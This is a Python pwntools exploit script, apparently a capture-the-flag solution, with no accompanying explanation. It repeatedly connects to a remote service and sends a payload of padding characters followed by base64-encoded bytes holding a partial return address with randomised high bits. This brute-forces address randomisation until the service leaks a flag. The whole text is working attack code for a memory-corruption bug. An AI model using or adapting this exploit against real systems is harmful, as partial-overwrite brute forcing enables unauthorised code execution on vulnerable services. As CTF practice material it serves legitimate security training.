from pwn import *
import base64
import sys
import random

if len(sys.argv) != 3:
    exit(f'{sys.argv[0]} <host> <port>')

host, port = sys.argv[1:]

while True:
    with remote(host, int(port)) as p:
        try:
            low_addr = 0x48a + (random.randint(0, 15) << 12)
            low_addr = int.to_bytes(low_addr, length=2, byteorder='little')

            payload = (
                39 * '='
                + base64.b64encode(b'\x00' + low_addr).decode().rstrip('=')
            )

            log.info(f'payload: {payload}')

            p.recvuntil(b'>> ')
            p.sendline(payload.encode())

            p.recvuntil(b'flag-')
            log.success('flag: flag-' + p.recvline().decode().strip())

            break
        except:
            pass